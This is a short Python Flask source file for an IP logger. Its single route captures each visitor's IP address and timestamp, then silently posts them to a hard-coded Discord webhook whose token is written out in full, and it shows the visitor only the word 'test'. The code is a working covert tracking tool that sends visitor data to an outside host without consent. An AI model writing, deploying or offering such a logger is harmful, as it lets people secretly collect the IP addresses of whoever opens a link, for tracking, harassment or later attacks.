from flask import Flask, request
import datetime, requests, json

app = Flask(__name__)

WEBHOOK_URL = "https://ptb.discord.com/api/webhooks/1489458192877617183/O4zvTeV3pxjfNsPQQcmi3twgcMOGDkXjxbUNyfH5MZxFZhGhFf2GjK9BHW-Jd_8Y47Li"

@app.route('/')
def log_ip():
    ip = request.remote_addr
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = {
        "content": f"**IP Logged**\n**Time:** {now}\n**IP:** `{ip}`"
    }
    
    try:
        requests.post(WEBHOOK_URL, json=data)
    except:
        pass  # Don't crash if webhook fails
    
    return "test"

if __name__ == "__main__":
    print("work")
    app.run(host="0.0.0.0", port=5000)
